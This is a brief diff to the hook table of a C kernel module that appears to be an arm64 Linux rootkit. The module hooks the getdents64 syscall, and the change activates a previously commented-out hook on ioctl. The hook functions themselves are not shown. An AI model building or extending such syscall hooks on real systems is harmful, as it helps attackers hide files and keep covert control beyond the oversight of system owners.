@@ -506,7 +506,7 @@ static void remove_hooks(struct ftrace_hook * hooks, size_t count)
 /* an array of functions we want to hook */
 static struct ftrace_hook hooks[] = {
     HOOK("__arm64_sys_getdents64", dolos_getdents64, &orig_getdents64),
-    //HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
+    HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
 };
 
 
